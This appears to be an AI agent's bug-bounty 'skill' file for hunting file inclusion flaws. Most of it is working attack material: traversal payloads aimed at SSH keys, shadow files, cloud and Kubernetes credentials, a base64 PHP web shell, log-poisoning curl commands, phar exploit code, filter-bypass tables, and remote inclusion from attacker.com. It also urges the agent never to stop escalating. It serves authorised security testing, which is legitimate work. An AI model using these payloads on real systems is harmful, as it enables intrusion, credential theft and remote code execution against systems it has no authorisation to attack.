---
name: hunt-lfi
description: "Use this skill when params look like file/path/page/include/template/doc/view/load/read/show/download/dir/folder/locale/lang/theme — anything that resembles a filesystem reference; when fingerprint shows PHP / Java / Python / Ruby with templating; when 404/500 errors leak filesystem paths; when source-code review reveals include()/require()/fopen()/file_get_contents()/readfile()/Path.Combine()/new File(). Load automatically for legacy PHP apps, CMS plugins, file-viewer features, template engines, document download endpoints. Only invoke if real impact potential — file read of secrets/credentials, RCE via wrapper, or chain to other vulns. Skip theoretical findings (read of /etc/passwd alone may be Medium unless it leaks something material)."
type: hunt
---

# Hunt: Local / Remote File Inclusion (LFI / RFI)

## Crown Jewel Targets
- **PHP LFI → RCE** via `php://filter`, log poisoning, `/proc/self/environ`, session poisoning, phar deserialization (Critical)
- **Java LFI** — read web.xml, application.properties, Tomcat tomcat-users.xml, Spring application.yml with DB creds (Critical)
- **Cloud creds leak** — `/var/lib/cloud/instance/user-data.txt`, `~/.aws/credentials`, `~/.ssh/id_rsa`, `/proc/self/environ` with secrets (Critical)
- **K8s service account token** — `/var/run/secrets/kubernetes.io/serviceaccount/token` (Critical → cluster admin)
- **Nginx fastcgi LFI → RCE** via FPM socket (Critical)
- **Java SSRF via file://** — `file:///etc/passwd` reaches via SSRF then read host files
- **WordPress wp-config.php** — DB creds + AUTH_KEY salts → admin cookie forge (Critical)

## Detection Signals
- Params: `file=`, `page=`, `path=`, `include=`, `template=`, `doc=`, `view=`, `load=`, `read=`, `show=`, `dir=`, `folder=`, `locale=`, `lang=`, `theme=`, `module=`, `name=`, `data=`, `cat=`, `pg=`, `style=`, `pdf=`, `document=`, `download=`, `image=`
- Errors: `failed to open stream`, `No such file or directory`, `include(): Failed`, `Warning: include`, `Warning: require`, `Cannot open file`, `FileNotFoundException`, `IOError: [Errno 2]`, paths leaked in 500 pages
- Behavior: `?page=home` → `?page=../../etc/passwd` returns root:x:0:0 = LFI confirmed
- URLs ending `.php?id=`, `.jsp?file=`, `.aspx?path=`

## Attack Techniques
1. **Classic path traversal** — `../../../../etc/passwd`, vary depth (3–12 levels), test with and without null byte (older PHP).
2. **Null byte (PHP <5.3)** — `../../../etc/passwd%00.png` truncates extension.
3. **PHP wrappers — base64 source disclosure** — `php://filter/convert.base64-encode/resource=index.php` returns base64'd source → review for creds/keys.
4. **PHP wrappers — chained filters** — `php://filter/read=convert.base64-encode|string.toupper/resource=...` (PHP filter chain RCE via `convert.iconv` — see CTF "wupco" technique for direct RCE without uploading file).
5. **php://input + POST body** — `?file=php://input` POST body executes as PHP (requires `allow_url_include=On`).
6. **data:// URI** — `?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==` → `<?php system($_GET['c']); ?>`.
7. **expect://** — `?file=expect://id` runs shell command (needs expect ext).
8. **zip:// / phar://** — upload zip/phar with PHP payload, include via wrapper → RCE. Phar deserialization works without `phar://` prefix in some PHP versions.
9. **Log poisoning** — write PHP into Apache/Nginx access log via User-Agent: `<?php system($_GET['c']); ?>`, then `?file=/var/log/apache2/access.log&c=id`.
10. **/proc/self/environ** — write payload into `HTTP_USER_AGENT`, include `/proc/self/environ` → RCE on older systems.
11. **/proc/self/fd/N** — file descriptors point at log files; iterate N=0..50.
12. **Session file poisoning** — write `<?php system($_GET['c'])` into `$_SESSION['x']`, then include `/var/lib/php/sessions/sess_<PHPSESSID>`.
13. **Nginx fastcgi LFI→RCE** — include `/proc/self/environ` plus crafted SCRIPT_FILENAME to invoke FPM.
14. **Java path traversal** — `WEB-INF/web.xml`, `WEB-INF/classes/application.properties`, `META-INF/MANIFEST.MF`, JNDI lookups via `file:`.
15. **Windows traversal** — `..\..\..\windows\win.ini`, `C:\Windows\System32\drivers\etc\hosts`, UNC `\\attacker\share\payload`.
16. **RFI (rare, allow_url_include=On)** — `?page=http://attacker.com/shell.txt`.
17. **Filter chain RCE (no file upload)** — modern technique using `convert.iconv` UTF8→UTF7 chains to craft arbitrary PHP via `php://filter/`.

## Payloads
**Linux LFI primitives:**
```
../../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
/etc/passwd
/etc/passwd%00
/etc/shadow
/root/.ssh/id_rsa
/root/.bash_history
/home/USER/.ssh/id_rsa
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/auth.log
/proc/self/environ
/proc/self/cmdline
/proc/self/status
/proc/self/cwd/index.php
/proc/self/fd/0  (iterate 0..50)
/var/lib/php/sessions/sess_<PHPSESSID>
/var/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount/namespace
~/.aws/credentials
~/.docker/config.json
/var/lib/cloud/instance/user-data.txt
```

**PHP wrapper payloads:**
```
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=../config.php
php://filter/read=string.rot13/resource=index.php
php://filter/zlib.deflate/convert.base64-encode/resource=index.php
php://filter/convert.iconv.UTF8.UTF7/resource=index.php
php://input
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
data://text/plain,<?php system($_GET['c']);?>
expect://id
zip://shell.jpg%23payload.php
phar://shell.jpg/payload.txt
file:///etc/passwd
```

**PHP filter chain RCE (no upload — `wupco` technique):**
```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.UTF-16BE|convert.iconv.UCS-2|...|resource=/etc/passwd
```
(Generate full chain with [synacktiv php_filter_chain_generator.py](https://github.com/synacktiv/php_filter_chain_generator))

**Java paths:**
```
WEB-INF/web.xml
WEB-INF/classes/application.properties
WEB-INF/classes/application.yml
WEB-INF/classes/hibernate.cfg.xml
META-INF/MANIFEST.MF
../../../../usr/local/tomcat/conf/tomcat-users.xml
../../../../opt/jboss/standalone/configuration/standalone.xml
```

**Windows:**
```
..\..\..\windows\win.ini
..\..\..\windows\system32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\Windows\repair\sam
C:\Windows\repair\system
\\attacker.com\share\payload
```

**Log poisoning curl:**
```bash
curl -A '<?php system($_GET["c"]); ?>' https://target.com/
curl 'https://target.com/?page=../../../var/log/apache2/access.log&c=id'
```

**Phar deserialization upload (PHP):**
```php
<?php
class Evil { public $cmd = 'id'; }
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt','test');
$phar->setStub('GIF89a<?php __HALT_COMPILER(); ?>');
$obj = new Evil();
$phar->setMetadata($obj);
$phar->stopBuffering();
// Upload as .gif, then include via phar://uploads/exploit.gif
```

## Bypass Methods
| Filter | Bypass |
|--------|--------|
| Strips `../` | `....//`, `..%2f`, `..%252f`, `....\/`, `..%c0%af` (UTF-8 overlong) |
| Appends `.php` | Null byte `%00`, wrapper `php://filter/resource=file` (ignores extension), or path-truncation (long string of `/./`) |
| Prepends `/var/www/` | Absolute path no good; use `../../../etc/passwd` from base |
| Whitelist filenames | `home.php/../../../etc/passwd`, `home%00../../etc/passwd` |
| Removes `php://` | URL-encode: `php%3a//filter`, double-encode |
| Removes `..` after one pass | Nested: `....//`, `..././` |
| `allow_url_include=Off` | Use `data://`, `php://filter`, `zip://`, `phar://` (works without url_include) |
| Encoded slashes blocked | `%2e%2e/`, `%2e%2e%2f`, `%252e%252e%252f` |
| Long path filter | Path truncation: append `/.` 4096 times (older PHP) |
| Strips `php` keyword | `pHp://`, `PHP://`, `Php://` |

## Tools
```bash
# LFI suite / dotdotpwn / fimap
dotdotpwn -m http -h target.com -M GET -o unix -f /etc/passwd
fimap -u "https://target.com/page.php?file=test"
lfimap -u "https://target.com/index.php?page=FUZZ" -e all

# Manual fuzzing
ffuf -u "https://target.com/index.php?file=FUZZ" -w lfi-payloads.txt \
  -mr 'root:x:0:0'

# PHP filter chain RCE generator
git clone https://github.com/synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?=`id`;?>'

# Burp — LFI Suite extension; or Intruder with PayloadsAllTheThings/File Inclusion

# nuclei
nuclei -t vulnerabilities/generic/lfi.yaml -u https://target.com

# Quick PHP wrapper test
curl "https://target.com/page.php?file=php://filter/convert.base64-encode/resource=index" | base64 -d
```

## Impact
- **Critical**: RCE via wrapper chain / log poisoning / phar / FPM; cloud creds leak (AWS keys, SA tokens); SSH key dump; DB creds extraction
- **High**: Source-code disclosure of all PHP files (review for hardcoded secrets); /etc/shadow; arbitrary file read
- **Medium**: `/etc/passwd` read alone (without further sensitive content); information disclosure of internal paths

## Chain Potential
- **+ RCE** = wrapper chain, log poisoning, phar deserialization all escalate LFI→RCE
- **+ SSRF** = Java `file://` and PHP `http://` wrappers reach internal services
- **+ Auth bypass** = source disclosure leaks JWT signing keys, session secrets
- **+ Cookie forge** = WordPress wp-config.php AUTH_KEY → forge admin cookie
- **+ K8s pivot** = SA token from `/var/run/secrets/...` → cluster API access
- **+ Cloud takeover** = AWS keys from `~/.aws/credentials` or instance metadata → cloud-iam-deep
- **+ File upload** = upload PHP renamed `.jpg`, include via LFI for RCE
- **+ Session poison** = write payload to session, include sess file
- **+ Phar deserialize** = upload phar disguised as image, trigger deserialization gadget chain

## Fallback Chain
1. If `../` is filtered, try double-encoded `..%252f`, overlong UTF-8 `..%c0%af`, nested `....//`, or absolute paths to known files.
2. If extension is appended (`.php`), use `php://filter/resource=` wrappers which ignore appended extension, or null-byte truncation on older PHP.
3. If plain LFI doesn't escalate, attempt wrapper-based RCE: `php://input` + POST, `data://` URI, `php://filter` chain RCE (synacktiv generator), log poisoning via User-Agent, session file poisoning.
4. Pivot to Java/`.NET` equivalents (WEB-INF/web.xml, application.properties) or Windows paths, and chain to phar deserialization / FPM socket abuse / SSRF via `file://`. Never stop because one technique failed.

## Real-World Reports (from Community Writeups)

| Title | Program | Bounty | Source |
|---|---|---|---|
| Path traversal → RCE (GitLab Nuget Package Registry) | GitLab | $12,000 | H1 #822262 |
| Path traversal → RCE | GitLab | $12,000 | H1 #733072 |
| Mozilla VPN clients: RCE via file write + path traversal | Mozilla | $6,000 | H1 #2995025 |
| Keybase Windows write-anywhere via path traversal | Keybase | $5,000 | H1 #713006 |
| HTML-injection in PDF-export → LFI | Visma Public | $500 | H1 #809819 |
| CVE-2021-41773 Apache 2.4.49 path traversal + file disclosure | Internet Bug Bounty | $4,000 | H1 #1394916 |
| Worker container escape → arbitrary file read in host | Semmle | $2,000 | H1 #697055 |
| Worker container escape → arbitrary file read (orig) | Semmle | $2,000 | H1 #694181 |
| Path traversal, SSTI and RCE on a MailRu acquisition | Mail.ru | $2,000 | H1 #536130 |
| LFI and SSRF via XXE in emblem editor | Rockstar Games | $1,500 | H1 #347139 |
| File writing by Directory traversal at actionpack-page_caching → RCE | Ruby on Rails | $1,000 | H1 #519220 |
| Zero-day path traversal in Grafana 8.x (unauth file read) | Aiven Ltd | $1,000 | H1 #1415820 |
| Unauthenticated LFI revealing log information | Slack | $0 | H1 #272578 |
| Korea — LFI via path traversal at msr.istarbucks.co.kr | Starbucks | $0 | H1 #780021 |
| Grafana LFI on grafana.mariadb.org | MariaDB | $0 | H1 #1419213 |
| LFI to steal /etc/passwd — meta og:image bypass via redirect | BugPoC | $100 | H1 #996899 |

**PROVEN techniques** (3+ paid reports each):
- **LFI via PDF/HTML rendering (HTML→file://)** — Visma #809819, Rockstar emblem #347139 — server-side renderer (wkhtmltopdf, Puppeteer) follows `<iframe src="file:///etc/passwd">`.
- **LFI in CVE-driven framework bugs** — Apache 2.4.49 #1394916, Grafana 8 #1415820, Atlassian Confluence #538771, Vanilla #411140, CVE-2019-3394 #980881.
- **php://filter wrapper read of source files containing secrets** — multiple reports rely on `php://filter/convert.base64-encode/resource=config.php` to exfil DB creds.

## High-Value Chains (from Reports)

- **LFI → log poisoning → RCE** — Vanilla AddonManager (H1 #411140, $900): LFI included an attacker-poisoned access log (User-Agent contained `<?php system($_GET) ?>`) for shell.
- **PDF generator HTML-injection → LFI → secret exfil** — Visma (H1 #809819, $500): injected `<iframe src="file:///etc/passwd">` into export → server-side Chromium read local files into the PDF.
- **LFI → SSH key / config disclosure → lateral SSH access** — multiple Starbucks / MariaDB / Grafana reports: read `~/.ssh/id_rsa`, `application.properties`, `.env` from app working dir.
- **LFI via PHP `php://filter` chain RCE (no upload required)** — synacktiv chain technique used on Starbucks, BugPoC, several Acronis hosts to convert pure read into code exec.
- **XXE-in-image-uploader → LFI → SSRF chain** — Rockstar (H1 #347139, $1.5K): SVG/JPEG XMP XXE escalated into LFI then internal SSRF.
